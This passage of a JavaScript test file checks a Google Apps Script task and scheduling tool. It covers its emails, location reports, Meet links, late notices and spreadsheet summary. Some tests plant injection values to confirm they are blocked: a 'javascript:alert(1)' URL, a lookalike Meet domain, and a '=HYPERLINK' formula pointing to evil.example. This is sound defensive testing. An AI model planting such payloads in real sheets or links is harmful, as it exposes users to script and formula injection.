  e24.user = 'takahashi@example.com'; e24.mails.length = 0;
  a24.updateTask(t2.id, 'start', {});
  const sm = e24.mails[0];
  ok('開始のお知らせも同じ形で、印は紺。住所やメモがなければ、その見出しは出ない', !!sm && /^開始: 点検/.test(sm.subject) && new RegExp('background:#1F2E38[^>]*>開始<').test(sm.options.htmlBody) && !/>住所</.test(sm.options.htmlBody) && !/>メモ</.test(sm.options.htmlBody) && />タスクを開く<\/a>/.test(sm.options.htmlBody));
  // リンクの通知
  e24.user = 'admin@example.com'; e24.mails.length = 0;
  const t3 = a24.createTask({ title: '引き継ぎ先', member: 'sato@example.com', start: at(12), end: at(13) }).tasks.filter(t => t.title === '引き継ぎ先')[0];
  e24.mails.length = 0;
  a24.linkTasks(t2.id, t3.id, '鍵を渡す', true);
  const km = e24.mails.filter(m => m.to === 'sato@example.com')[0];
  ok('リンクのお知らせも同じ形（印は「リンク」、リンク先とメモが入る）', !!km && /タスクがリンクされました: 引き継ぎ先/.test(km.subject) && />リンク<\/span>/.test(km.options.htmlBody) && />リンク先</.test(km.options.htmlBody) && /点検 10:00–11:00/.test(km.options.htmlBody) && /鍵を渡す/.test(km.options.htmlBody) && />タスクを開く<\/a>/.test(km.options.htmlBody));
  // 招待は、これまでどおり
  e24.autoJoin = false; e24.mails.length = 0;
  a24.addMember({ email: 'new@gmail.com', name: '新しい人', board: '' });
  const im = e24.mails[0].options.htmlBody;
  ok('招待のメールは、これまでどおりの中身で、同じ外枠', /サンプル &lt;b&gt; のボードに参加しますか？/.test(im) && />参加する<\/a>/.test(im) && /さんからの招待です。/.test(im) && />Scurrop</.test(im) && /max-width:480px/.test(im) && /max-width:480px/.test(html));
  require('fs').mkdirSync(__dirname + '/out', { recursive: true });
  require('fs').writeFileSync(__dirname + '/out/mail-late.html', '<!doctype html><meta charset="utf-8"><body style="margin:0;background:#fff">' + html + '</body>');
}

// 設定（タスクの初めの値・版・置き場所）
{
  const e25 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a25 = e25.api; e25.now = at(8);
  a25.initProject({ name: '訪問サービス' });
  a25.addMember({ email: 'sato@example.com', name: '佐藤 美咲', board: '' });
  let st = a25.getState();
  ok('管理者には、版と、このツールの置き場所（GitHub）が届く', /^\d+\.\d+(\.\d+)?$/.test(st.version) && st.repoUrl === 'https://github.com/Hamnism/scurrop');
  { const readme = require('fs').readFileSync(__dirname + '/../README.md', 'utf8'); // 開発用の README は、見出しに版を書く。公開用の README には版を書かない
    ok('版の番号は、README の見出しと同じ（見出しに版を書いている場合）', !/^# Scurrop v/.test(readme) || new RegExp('^# Scurrop v' + st.version.replace(/\./g, '\\.') + '\\b').test(readme)); }
  ok('ボタンなどの色を変える機能はない', typeof a25.setTheme === 'undefined' && st.project.theme === undefined && st.themes === undefined && JSON.parse(a25.doGet({ parameter: {} }).boot).theme === undefined);
  e25.user = 'sato@example.com';
  st = a25.getState();
  ok('メンバーには、版と置き場所は届かない', st.version === '' && st.repoUrl === '');
  throws('メンバーは、タスクの初めの値を変えられない', () => a25.setDefaults({ geo: true }), /管理者/);
  e25.user = 'admin@example.com';
  // お知らせのメールの色は、いつも紺
  a25.doGet({ parameter: {} }); a25.getState();
  a25.createTask({ title: '訪問', member: 'sato@example.com', start: at(9), end: at(10) });
  e25.user = ''; e25.now = at(9, 11); e25.mails.length = 0; e25.runTick(); e25.user = 'admin@example.com';
  const html = e25.mails[0].options.htmlBody;
  ok('お知らせのメールのボタンと名前は紺（遅延の印は赤）', /background:#1F2E38;color:#FFFFFF[^>]*>タスクを開く</.test(html) && /color:#1F2E38">Scurrop/.test(html) && /background:#FF3B30[^>]*>開始の遅延</.test(html));
  // タスクの初めの値
  ok('タスクの初めの値: 位置情報の記録は、初めはオフ', a25.getState().defaults.geo === false);
  st = a25.setDefaults({ geo: true });
  ok('初めの値をオンにできる', st.defaults.geo === true && e25.props.DEFAULT_GEO === 'true');
  st = a25.setDefaults({ geo: 'yes' });
  ok('true / false 以外は無視する', st.defaults.geo === true);
  st = a25.setDefaults({ geo: false });
  ok('オフに戻せる', st.defaults.geo === false && e25.props.DEFAULT_GEO === undefined);
  e25.props.THEME = '#514C94'; a25.setDefaults({ geo: true });
  a25.resetProject();
  ok('リセットすると、初めの値も消える（前の版で覚えていたボタンの色も消える）', e25.props.THEME === undefined && e25.props.DEFAULT_GEO === undefined);
}

// 報告の中身（管理者が、タスクごとに開始・完了の時刻と場所を見る）
{
  const e26 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a26 = e26.api; e26.now = at(8);
  a26.initProject({ name: '訪問サービス' });
  a26.addMember({ email: 'sato@example.com', name: '佐藤 美咲', board: '' });
  a26.addMember({ email: 'takahashi@example.com', name: '高橋 健', board: '' });
  const t1 = a26.createTask({ title: '位置あり', member: 'sato@example.com', start: at(9), end: at(10), geo: true }).tasks.filter(t => t.title === '位置あり')[0];
  const t2 = a26.createTask({ title: '位置なし', member: 'sato@example.com', start: at(10), end: at(11) }).tasks.filter(t => t.title === '位置なし')[0];
  const t3 = a26.createTask({ title: '高橋の', member: 'takahashi@example.com', start: at(9), end: at(10), geo: true }).tasks.filter(t => t.title === '高橋の')[0];
  e26.user = 'sato@example.com'; e26.now = at(9, 2);
  a26.updateTask(t1.id, 'start', { geo: { lat: 35.6329, lng: 139.7381, acc: 21.4 }, note: '着きました' });
  e26.now = at(9, 58);
  a26.updateTask(t1.id, 'done', { geoError: 'User denied Geolocation' });
  a26.updateTask(t2.id, 'start', { geo: { lat: 35.1, lng: 139.1, acc: 5 } });
  e26.user = 'takahashi@example.com';
  a26.updateTask(t3.id, 'start', { geo: { lat: 34.7, lng: 135.5, acc: 9 } });
  e26.user = 'admin@example.com';
  let st = a26.getState();
  const r1 = st.tasks.filter(t => t.id === t1.id)[0];
  ok('管理者には、開始のときの場所（緯度・経度・誤差）と時刻が、タスクごとに届く', r1.spots.start.geo.lat === 35.6329 && r1.spots.start.geo.lng === 139.7381 && r1.spots.start.geo.acc === 21 && r1.spots.start.time === at(9, 2) && r1.started === at(9, 2));
  ok('場所を取れなかった完了は、場所なしで、「取得できず」の印が付く', r1.spots.done.geo === null && r1.spots.done.miss === true && r1.spots.done.time === at(9, 58) && r1.note === '着きました');
  ok('位置情報を記録しないタスクには、場所は付かない', (() => { const x = st.tasks.filter(t => t.id === t2.id)[0]; return x.spots.start.geo === null && x.spots.start.miss === false; })());
  ok('まだ始まっていないタスクには、報告がない', a26.createTask({ title: 'まだ', member: 'sato@example.com', start: at(15), end: at(16) }).tasks.filter(t => t.title === 'まだ')[0].spots === null);
  ok('管理者に届く履歴にも、場所が入る', st.history.some(h => h.task === t1.id && h.action === 'start' && h.geo && h.geo.lat === 35.6329) && st.history.filter(h => h.task === t1.id && h.action === 'done')[0].geo === null);
  e26.user = 'sato@example.com';
  st = a26.getState();
  ok('メンバーには、場所そのもの（緯度・経度）は渡らない。「位置あり」とだけ届く（自分の分でも）', st.tasks.every(t => t.spots === null) && st.history.every(h => h.geo === null) && st.history.some(h => h.task === t1.id && h.hasGeo) && !/35\.6329|139\.7381|34\.7|135\.5/.test(JSON.stringify(st)));
  e26.user = 'someone@gmail.com';
  ok('登録のない人には、場所は渡らない', !/35\.6329|139\.7381/.test(JSON.stringify(a26.getState())));
  // シートを手で書き換えて、数でないものが入っていたとき
  e26.user = 'admin@example.com';
  const hd = e26.sheets.history._d; const li = hd[0].indexOf('lat'), gi = hd[0].indexOf('lng');
  hd.filter(r => r[hd[0].indexOf('task_id')] === t3.id && r[hd[0].indexOf('action')] === 'start')[0][li] = 'javascript:alert(1)';
  st = a26.getState();
  ok('場所の欄に数でないものが入っていたら、場所として扱わない', st.tasks.filter(t => t.id === t3.id)[0].spots.start.geo === null && !/javascript:/.test(JSON.stringify(st.tasks)));
  hd.filter(r => r[hd[0].indexOf('task_id')] === t2.id && r[hd[0].indexOf('action')] === 'start')[0][li] = 999;
  ok('ありえない緯度（90 を超える）も、場所として扱わない', a26.getState().tasks.filter(t => t.id === t2.id)[0].spots.start.geo === null);
}

// Meet（タスクの予定ごとに Meet のリンクを付ける。権限は増やさない）
{
  const e27 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a27 = e27.api; e27.now = at(8);
  a27.initProject({ name: '訪問サービス' });
  a27.addMember({ email: 'sato@example.com', name: '佐藤 美咲', board: '' });
  a27.addMember({ email: 'takahashi@example.com', name: '高橋 健', board: '' });
  const task = (st, title) => st.tasks.filter(t => t.title === title)[0];
  const cell = (id) => { const d = e27.sheets.tasks._d; const r = d.filter(x => x[0] === id)[0]; return r[d[0].indexOf('meet')]; };
  const live = () => e27.events.filter(x => !x.deleted);
  let st = a27.createTask({ title: 'なし', member: 'sato@example.com', start: at(9), end: at(10) });
  ok('何も指定しなければ、Meet は付かない', task(st, 'なし').meet === false && task(st, 'なし').meetUrl === '' && !live()[0].meet && cell(task(st, 'なし').id) === '');
  st = a27.createTask({ title: 'あり', member: 'sato@example.com', start: at(10), end: at(11), meet: true });
  const t1 = task(st, 'あり');
  ok('Meet を付けると、予定に Meet が付き、リンクがタスクに入る', t1.meet === true && /^https:\/\/meet\.google\.com\/abc-ev\d+-xyz$/.test(t1.meetUrl) && live().filter(x => x.meet === t1.meetUrl).length === 1 && !st.notice);
  ok('true 以外の値では付かない', task(a27.createTask({ title: '文字', member: 'sato@example.com', start: at(11), end: at(12), meet: 'true' }), '文字').meet === false);
  e27.user = 'sato@example.com';
  ok('メンバーにも、自分のタスクの Meet のリンクが届く', a27.getState().tasks.filter(t => t.id === t1.id)[0].meetUrl === t1.meetUrl);
  e27.user = 'takahashi@example.com';
  ok('ほかのメンバーには届かない', !JSON.stringify(a27.getState()).includes('meet.google.com'));
  e27.user = 'admin@example.com';
  // 未割り当て → 割り当て
  st = a27.createTask({ title: 'あとで', member: '', start: at(13), end: at(14), meet: true });
  const t2 = task(st, 'あとで');
  ok('未割り当てのタスクは、付けることだけ覚えておく（予定がないので、リンクはまだない）', t2.meet === true && t2.meetUrl === '' && cell(t2.id) === 'on');
  st = a27.assignTask(t2.id, 'takahashi@example.com');
  ok('割り当てると、できた予定に Meet が付く', /^https:\/\/meet\.google\.com\//.test(task(st, 'あとで').meetUrl) && !st.notice);
  // 変更
  const url1 = t1.meetUrl; const made1 = live().filter(x => x.meet === url1)[0].meetMade;
  st = a27.editTask(t1.id, { title: 'あり', member: 'sato@example.com', start: at(10, 30), end: at(11, 30), memo: '', address: '' });
  ok('同じメンバーのまま時間を変えても、Meet のリンクは同じ（作り直さない）', task(st, 'あり').meetUrl === url1 && live().filter(x => x.meet === url1)[0].meetMade === made1);
  st = a27.editTask(t1.id, { title: 'あり', member: 'takahashi@example.com', start: at(10, 30), end: at(11, 30), memo: '', address: '' });
  const url2 = task(st, 'あり').meetUrl;
  ok('メンバーを変えると予定を作り直すので、Meet のリンクも新しくなる', /^https:\/\/meet\.google\.com\//.test(url2) && url2 !== url1 && live().filter(x => x.meet === url2).length === 1);
  st = a27.editTask(t1.id, { title: 'あり', member: 'takahashi@example.com', start: at(10, 30), end: at(11, 30), memo: '', address: '', meet: false });
  ok('あとから Meet を外せる（予定からも外れ、履歴に残る）', task(st, 'あり').meet === false && task(st, 'あり').meetUrl === '' && !live().some(x => x.meet === url2) && st.history.some(h => h.task === t1.id && /Meet をオフ/.test(h.note)));
  st = a27.editTask(task(st, 'なし').id, { title: 'なし', member: 'sato@example.com', start: at(9), end: at(10), memo: '', address: '', meet: true });
  ok('あとから Meet を付けられる（予定は作り直さない）', /^https:\/\/meet\.google\.com\//.test(task(st, 'なし').meetUrl) && st.history.some(h => /Meet をオン/.test(h.note)) && task(st, 'なし').hasEvent);
  st = a27.editTask(task(st, 'なし').id, { title: 'なし', member: '', start: at(9), end: at(10), memo: '', address: '' });
  ok('メンバーを外すと予定が消えるので、リンクもなくなる（付けることは覚えている）', task(st, 'なし').meet === true && task(st, 'なし').meetUrl === '' && cell(task(st, 'なし').id) === 'on');
  // 失敗
  e27.meetFail = true;
  st = a27.createTask({ title: '失敗', member: 'sato@example.com', start: at(14), end: at(15), meet: true });
  ok('Meet を作れなくても、タスクと予定はできて、理由が出る', task(st, '失敗').hasEvent && task(st, '失敗').meet === true && task(st, '失敗').meetUrl === '' && /Meet リンクを作成できませんでした: Invalid conference type value/.test(st.notice));
  e27.meetFail = false; e27.noCalendarApi = true;
  st = a27.createTask({ title: 'サービスなし', member: 'sato@example.com', start: at(15), end: at(16), meet: true });
  ok('Calendar のサービスが入っていないときも、タスクはできて理由が出る', task(st, 'サービスなし').hasEvent && /サービスが有効になっていません/.test(st.notice));
  e27.noCalendarApi = false;
  st = a27.editTask(task(st, '失敗').id, { title: '失敗', member: 'sato@example.com', start: at(14), end: at(15), memo: '', address: '', meet: true });
  ok('作れなかったタスクは、変更の画面で保存し直すと、もう一度試す', /^https:\/\/meet\.google\.com\//.test(task(st, '失敗').meetUrl));
  // リンクがすぐ返らないとき
  e27.meetPending = true;
  st = a27.createTask({ title: '待ち', member: 'sato@example.com', start: at(16), end: at(17), meet: true });
  const tw = task(st, '待ち');
  ok('リンクがすぐ返らないときは、待ちにしておく', tw.meet === true && tw.meetUrl === '' && cell(tw.id) === 'wait' && !st.notice);
  const calls0 = e27.reads.cal; a27.getState();
  ok('待ちのあいだは、管理者が開くたびに 1 つだけ取りに行く', e27.reads.cal === calls0 + 1 && cell(tw.id) === 'wait');
  e27.user = 'sato@example.com'; const calls1 = e27.reads.cal; a27.getState();
  ok('メンバーが開いたときは、取りに行かない', e27.reads.cal === calls1);
  e27.user = 'admin@example.com'; e27.meetPending = false;
  st = a27.getState();
  ok('リンクができたら、次に管理者が開いたときに入る', /^https:\/\/meet\.google\.com\//.test(task(st, '待ち').meetUrl));
  const calls2 = e27.reads.cal; a27.getState();
  ok('待ちがなくなれば、取りに行かない', e27.reads.cal === calls2);
  // シートを手で書き換えたとき
  const d = e27.sheets.tasks._d; d.filter(x => x[0] === tw.id)[0][d[0].indexOf('meet')] = 'javascript:alert(1)';
  st = a27.getState();
  ok('Meet の欄に、Meet のリンクでないものが入っていたら、リンクとして渡さない', task(st, '待ち').meetUrl === '' && !JSON.stringify(st.tasks).includes('javascript:'));
  d.filter(x => x[0] === tw.id)[0][d[0].indexOf('meet')] = 'https://meet.google.com.evil.example/abc';
  ok('Meet に似せた別のサイトのリンクも渡さない', task(a27.getState(), '待ち').meetUrl === '');
  // 初めの値
  st = a27.setDefaults({ meet: true });
  ok('タスクの初めの値: Meet を付ける、をオンにできる（位置情報の設定は変わらない）', st.defaults.meet === true && st.defaults.geo === false && e27.props.DEFAULT_MEET === 'true');
  st = a27.setDefaults({ meet: false });
  ok('オフに戻せる', st.defaults.meet === false && e27.props.DEFAULT_MEET === undefined);
  // 前の版のシート
  const e28 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a28 = e28.api; e28.now = at(8);
  a28.initProject({ name: '前の版' });
  a28.addMember({ email: 'sato@example.com', name: '佐藤 美咲', board: '' });
  a28.createTask({ title: '前の版のタスク', member: 'sato@example.com', start: at(9), end: at(10) });
  const d8 = e28.sheets.tasks._d; const mi = d8[0].indexOf('meet'); d8.forEach(r => r.splice(mi, 1)); e28.props.SCHEMA = '10';
  st = a28.getState();
  ok('前の版のシートには meet の列が足され、前からあるタスクには Meet が付かない', e28.sheets.tasks._d[0].indexOf('meet') >= 0 && e28.props.SCHEMA === SCHEMA_NOW && st.tasks[0].meet === false);
}

// テンプレートの初めの値と、遅延の連絡
{
  const e29 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a29 = e29.api; e29.now = at(8);
  a29.initProject({ name: '訪問サービス' });
  a29.addMember({ email: 'sato@example.com', name: '佐藤 美咲', board: '' });
  a29.addMember({ email: 'takahashi@example.com', name: '高橋 健', board: '' });
  a29.addMember({ email: 'admin2@example.com', name: '管理者 2', board: '' });
  a29.updateMember('admin2@example.com', { name: '管理者 2', role: 'admin', board: '' });
  let st = a29.saveTemplate({ name: '訪問', board: '', minutes: 45, fields: [], geo: true, meet: true });
  ok('テンプレートに、位置情報と Meet の初めの値を持たせられる', st.templates[0].geo === true && st.templates[0].meet === true);
  st = a29.saveTemplate({ name: '事務', board: '', minutes: 30, fields: [] });
  ok('指定しなければ、どちらもオフ', st.templates.filter(t => t.name === '事務')[0].geo === false && st.templates.filter(t => t.name === '事務')[0].meet === false);
  st = a29.saveTemplate({ id: st.templates.filter(t => t.name === '訪問')[0].id, name: '訪問', board: '', minutes: 45, fields: [], geo: false, meet: true });
  ok('あとから変えられる', st.templates.filter(t => t.name === '訪問')[0].geo === false && st.templates.filter(t => t.name === '訪問')[0].meet === true);
  // 遅延の連絡
  a29.doGet({ parameter: {} });
  const t1 = a29.createTask({ title: '訪問 A', member: 'sato@example.com', start: at(9), end: at(10) }).tasks.filter(t => t.title === '訪問 A')[0];
  e29.user = 'sato@example.com'; e29.now = at(8, 50); e29.mails.length = 0;
  st = a29.reportLate(t1.id, { minutes: 15, note: '電車が止まっています' });
  ok('メンバーは、自分のタスクの遅延を連絡できる。履歴に残る', st.history.some(h => h.task === t1.id && h.action === 'late' && /約 15 分の遅延 \/ 電車が止まっています/.test(h.note)) && !st.notice);
  ok('連絡は、管理者の全員にメールで届く（メンバーには送らない）', e29.mails.length === 2 && e29.mails.map(m => m.to).sort().join() === 'admin2@example.com,admin@example.com' && e29.mails.every(m => /^遅延の連絡: 訪問 A 9:00–10:00（佐藤 美咲）$/.test(m.subject) && /約 15 分遅れます/.test(m.body) && /メモ: 電車が止まっています/.test(m.body)));
  ok('メールは、お知らせの形（赤い印、連絡の内容、タスクを開くボタン）', /background:#FF3B30[^>]*>遅延の連絡</.test(e29.mails[0].options.htmlBody) && />連絡</.test(e29.mails[0].options.htmlBody) && /約 15 分遅れます/.test(e29.mails[0].options.htmlBody) && />タスクを開く<\/a>/.test(e29.mails[0].options.htmlBody));
  throws('続けてすぐには送れない（管理者へのメールが増えすぎないように）', () => a29.reportLate(t1.id, { minutes: 20 }), /しばらくしてから/);
  e29.now = at(8, 52);
  st = a29.reportLate(t1.id, { minutes: 30 });
  ok('1 分たてば、送り直せる', st.history.filter(h => h.task === t1.id && h.action === 'late').length === 2);
  // 自動の遅延の知らせを重ねない
  e29.user = ''; e29.now = at(9, 20); e29.mails.length = 0;
  e29.triggers.length && e29.runTick();
  e29.user = 'admin@example.com'; a29.getState();
  ok('連絡があったタスクには、自動の遅延の知らせを重ねて出さない', e29.mails.length === 0);
  // できないこと
  e29.user = 'takahashi@example.com';
  throws('ほかの人のタスクの遅延は連絡できない', () => a29.reportLate(t1.id, { minutes: 15 }), /担当ではありません/);
  e29.user = 'admin@example.com';
  throws('管理者でも、担当でなければ連絡はできない', () => a29.reportLate(t1.id, { minutes: 15 }), /担当ではありません/);
  e29.user = 'sato@example.com';
  throws('遅れる時間が正しくなければ断る（0 分）', () => a29.reportLate(t1.id, { minutes: 0 }), /遅延時間/);
  throws('遅れる時間が正しくなければ断る（文字）', () => a29.reportLate(t1.id, { minutes: 'abc' }), /遅延時間/);
  throws('遅れる時間が正しくなければ断る（長すぎる）', () => a29.reportLate(t1.id, { minutes: 9999 }), /遅延時間/);
  e29.now = at(9, 30); a29.updateTask(t1.id, 'start', {});
  throws('始めたあとは、遅延の連絡はできない', () => a29.reportLate(t1.id, { minutes: 15 }), /すでに開始/);
  e29.user = '';
  throws('ログインしていない人は、遅延の連絡を使えない', () => a29.reportLate(t1.id, { minutes: 15 }), /アカウントを確認できません/);
  // メールが送れないとき
  e29.user = 'admin@example.com';
  const t2 = a29.createTask({ title: '訪問 B', member: 'sato@example.com', start: at(11), end: at(12) }).tasks.filter(t => t.title === '訪問 B')[0];
  e29.user = 'sato@example.com'; e29.mailFail = true;
  st = a29.reportLate(t2.id, { minutes: 10 });
  ok('メールを送れなくても、連絡は履歴に残り、送れなかったことが出る', st.history.some(h => h.task === t2.id && h.action === 'late') && /連絡は記録しましたが、管理者へのメールを送信できませんでした/.test(st.notice));
  e29.mailFail = false;
}

// 集計（スプレッドシートの側で見る）: ばらばらのシートを 1 枚の「稼働リスト」に統合し、「サマリー」で月・ボード・メンバーごとにまとめる
{
  const e31 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a31 = e31.api;
  const on = (d, h, m) => new Date(2026, 10, d, h, m || 0).getTime();
  e31.now = on(13, 8);
  a31.initProject({ name: '訪問サービス' });
  a31.addBoard({ name: 'Driver', color: '#514C94' }); a31.addBoard({ name: 'Sales', color: '#5271C7' });
  a31.addMember({ email: 'sato@example.com', name: '佐藤 美咲', board: 'Driver' });
  a31.addMember({ email: 'takahashi@example.com', name: '高橋 健', board: 'Sales' });
  let st = a31.saveTemplate({ name: '点検', board: 'Driver', minutes: 60, fields: [{ label: '台数', type: 'number' }, { label: '結果', type: 'select', options: ['良', '要対応'] }, { label: '対応', type: 'multi', options: ['清掃', '交換'] }, { label: '現場の写真', type: 'photo' }] });
  const tplA = st.templates.filter(t => t.name === '点検')[0];
  st = a31.saveTemplate({ name: '営業', board: 'Sales', minutes: 30, fields: [{ label: '結果', type: 'text' }, { label: '次回', type: 'date' }] });
  const tplB = st.templates.filter(t => t.name === '営業')[0];
  const keyOf = (tpl, label) => tpl.fields.filter(f => f.label === label)[0].key;
  const mk = (title, member, d, h1, h2, extra) => a31.createTask(Object.assign({ title, member, start: on(d, h1), end: on(d, h2) }, extra || {})).tasks.filter(t => t.title === title)[0] || a31.getState({ day: '2026-11-' + ('0' + d).slice(-2) }).tasks.filter(t => t.title === title)[0];
  const A = mk('A', 'sato@example.com', 13, 9, 10, { templateId: tplA.id, geo: true, meet: true, address: '東京都港区', memo: '裏口から' });
  const B = mk('B', 'sato@example.com', 13, 13, 14);
  const C = mk('C', 'sato@example.com', 14, 9, 10);
  const D = mk('D', 'takahashi@example.com', 13, 9, 10, { templateId: tplB.id });
  const E = mk('=1+1', 'takahashi@example.com', 14, 9, 10);
  a31.createTask({ title: 'だれかに', member: '', start: on(13, 15), end: on(13, 16) });
  a31.createTask({ title: '来月', member: 'sato@example.com', start: new Date(2026, 11, 1, 9).getTime(), end: new Date(2026, 11, 1, 10).getTime() });
  a31.linkTasks(A.id, D.id, '引き継ぎ', false);
  const TH = 'data:image/jpeg;base64,' + 'A'.repeat(500), FULL = 'data:image/jpeg;base64,' + Buffer.from('x'.repeat(3000)).toString('base64');
  e31.user = 'sato@example.com';
  e31.now = on(13, 9, 12); a31.updateTask(A.id, 'start', { geo: { lat: 35.6329, lng: 139.7381, acc: 20 } });   // 12 分の遅延
  a31.addTaskPhoto(A.id, { field: keyOf(tplA, '現場の写真'), thumb: TH, full: FULL });
  a31.addTaskPhoto(A.id, { field: keyOf(tplA, '現場の写真'), thumb: TH, full: FULL });
  e31.now = on(13, 9, 57); a31.updateTask(A.id, 'done', { note: '異常なし', geo: { lat: 35.64, lng: 139.74, acc: 15 }, values: { [keyOf(tplA, '台数')]: 3, [keyOf(tplA, '結果')]: '良', [keyOf(tplA, '対応')]: ['清掃', '交換'] } });   // 45 分
  e31.now = on(13, 13, 0); a31.updateTask(B.id, 'start', {}); e31.now = on(13, 14, 15); a31.updateTask(B.id, 'done', {});   // 75 分、遅延なし
  e31.now = on(14, 9, 0); a31.updateTask(C.id, 'start', {});   // 始めただけ
  e31.user = 'takahashi@example.com';
  e31.now = on(13, 9, 10); a31.updateTask(D.id, 'start', {}); e31.now = on(13, 9, 40); a31.updateTask(D.id, 'done', { values: { [keyOf(tplB, '結果')]: '=HYPERLINK("http://evil.example","x")', [keyOf(tplB, '次回')]: '2026-12-01' } });   // 30 分、10 分の遅延
  e31.user = 'admin@example.com'; e31.now = on(14, 12);
  e31.formulas.length = 0;
  let sm = a31.openSummary();
  const SB = () => e31.books[e31.props.SUM_FILE]._sheets; // 集計は、ドライブに作った別のスプレッドシートに入る
  const lsh = SB()['稼働リスト'], vsh = SB()['サマリー'];
  const head = lsh ? lsh._d[0] : [];
  const col = (n) => head.indexOf(n);
  const row = (title) => lsh._d.filter(r => r[col('タスク')] === title)[0];
  ok('スプレッドシートに「稼働リスト」ができ、タスクごとに 1 行入る（未割り当てのタスクも、ほかの月のタスクも入る）', !!lsh && lsh._d.length === 8 && sm.rows === 7 && !!row('だれかに') && row('来月')[col('月')] === '2026-12');
  ok('見出し: 決まった列のあとに、テンプレートのフィールドが名前ごとに 1 列ずつ並ぶ（同じ名前はまとめる。写真のフィールドは列にしない）', head.slice(0, 9).join() === '月,日付,曜日,ボード,メンバー,ロール,タスク,テンプレート,ステータス' && head.filter(h => h === '結果').length === 1 && col('台数') > 0 && col('対応') > 0 && col('次回') > 0 && col('現場の写真') < 0 && head.slice(-3).join() === '完了数,稼働日,遅延（回）');
  const rA = row('A');
  ok('だれが・どのボードで・いつ: 月、日付、曜日、ボード、メンバー、ロール、テンプレート、ステータス', rA[col('月')] === '2026-11' && rA[col('日付')] === '2026-11-13' && rA[col('曜日')] === '金' && rA[col('ボード')] === 'Driver' && rA[col('メンバー')] === '佐藤 美咲' && rA[col('ロール')] === 'メンバー' && rA[col('テンプレート')] === '点検' && rA[col('ステータス')] === '完了');
  ok('どれくらい稼働したか: 予定と実際の時刻、稼働時間（分と時間）、遅延（分）', rA[col('予定開始')] === '9:00' && rA[col('予定終了')] === '10:00' && rA[col('実績開始')] === '9:12' && rA[col('完了')] === '9:57' && rA[col('稼働時間（分）')] === 45 && rA[col('稼働時間（時間）')] === 0.8 && rA[col('遅延（分）')] === 12);
  ok('タスクの中身と報告: 住所、メモ、報告メモ、写真の枚数、リンク先', rA[col('住所')] === '東京都港区' && rA[col('メモ')] === '裏口から' && rA[col('報告メモ')] === '異常なし' && rA[col('写真（枚）')] === 2 && rA[col('リンク先')] === 'D（高橋 健）');
  ok('報告のフィールドの値が、同じ行に入る（数は数のまま、複数選択は「・」でつなぐ）', rA[col('台数')] === 3 && rA[col('結果')] === '良' && rA[col('対応')] === '清掃・交換' && rA[col('次回')] === '');
  const rD = row('D');
  ok('別のテンプレートの同じ名前のフィールドは、同じ列に入る。そのテンプレートにないフィールドは空', rD[col('ボード')] === 'Sales' && rD[col('テンプレート')] === '営業' && rD[col('次回')] === '2026-12-01' && rD[col('台数')] === '' && rD[col('遅延（分）')] === 10);
  ok('場所・写真・Meet は、押すと開くリンクになる（「地図」「開く」「Meet」の短い字）', rA[col('開始場所')] === '地図' && rA[col('完了場所')] === '地図' && rA[col('写真')] === '開く' && rA[col('Meet')] === 'Meet' && lsh._links.length === 4 && lsh._links.some(l => l[3] === 'https://www.google.com/maps/search/?api=1&query=35.6329,139.7381') && lsh._links.some(l => /^https:\/\/drive\.google\.com\/file\/d\/drv\d+\/view$/.test(l[3])) && lsh._links.some(l => /^https:\/\/meet\.google\.com\//.test(l[3])));
  ok('リンクの置き換えは、列ごとに 1 回でまとめて書く（行が多くても遅くならない）', e31.reads.rich === 4);
  ok('始めただけ・始めていない・未割り当ての行', row('C')[col('ステータス')] === 'アクティブ' && row('C')[col('稼働時間（分）')] === 0 && row('C')[col('稼働日')] === '2026-11-14' && row('=1+1')[col('ステータス')] === '予定' && row('=1+1')[col('稼働日')] === '' && row('だれかに')[col('メンバー')] === '未割り当て' && row('だれかに')[col('ボード')] === '');
  ok('名前やフィールドの値に式が入っていても、式として動かない（リストには式を 1 つも書かない）', e31.formulas.length === 0 && rD[col('結果')] === '=HYPERLINK("http://evil.example","x")' && row('=1+1')[col('タスク')] === '=1+1');
  ok('見た目: 見出しは紺の地に白い太字で固定し、絞り込みとしま模様を付ける。計算用の 3 列は隠す', lsh._fmt.some(f => f[0] === 'setBackground' && f[1] === '#1F2E38' && f[2] === 1) && lsh._fmt.some(f => f[0] === 'setFontWeight' && f[1] === 'bold') && lsh._frozen.cols === col('メンバー') + 1 && !!lsh._filter && lsh._bands.length === 1 && lsh._hidden.join() === [head.length - 2, head.length - 1, head.length].join() && lsh._rules.length === 1 && lsh._rules[0].gt === 0 && lsh._rules[0].ranges[0][1] === col('遅延（分）') + 1);
  const pt = vsh && vsh._pivots[0];
  ok('「サマリー」は、月・ボード・メンバーごとの、稼働日数・タスク・完了・稼働時間・遅延（ピボットテーブル）', !!pt && vsh._pivots.length === 1 && pt.src.name === '稼働リスト' && pt.src.rows === 8 && pt.src.cols === head.length && pt.rowGroups.join() === [col('月') + 1, col('ボード') + 1, col('メンバー') + 1].join() && pt.values.map(v => v.name + ':' + v.fn).join() === '稼働日数:COUNTUNIQUE,タスク:COUNTA,完了:SUM,稼働時間（時間）:SUM,遅延（回）:SUM' && pt.values[0].col === col('稼働日') + 1 && pt.values[3].col === col('稼働時間（時間）') + 1);
  ok('開く先: 「稼働リスト」と「サマリー」', sm.url === 'https://docs.google.com/spreadsheets/d/' + e31.props.SUM_FILE + '/edit#gid=' + lsh.getSheetId() && sm.viewUrl === 'https://docs.google.com/spreadsheets/d/' + e31.props.SUM_FILE + '/edit#gid=' + vsh.getSheetId() && sm.own === true && sm.pivot === true && sm.notes.length === 0);
  ok('集計を更新したことが履歴に残る', a31.getState().history.some(h => h.action === 'report' && /集計を更新（7 件）/.test(h.note)));
  ok('管理者には、スプレッドシートを開く先が届く', a31.getState().sheetUrl === 'https://docs.google.com/spreadsheets/d/SHEET1/edit');
  sm = a31.openSummary();
  ok('もう一度開くと、同じシートを作り直す（行も、絞り込みも、しま模様も、ピボットテーブルも増えていかない）', SB()['稼働リスト']._d.length === 8 && SB()['稼働リスト']._bands.length === 1 && !!SB()['稼働リスト']._filter && SB()['サマリー']._pivots.length === 1 && sm.notes.length === 0);
  // 見た目の手順が 1 つ失敗しても、リストはできる
  e31.decoFail = 'setRichTextValue';
  sm = a31.openSummary();
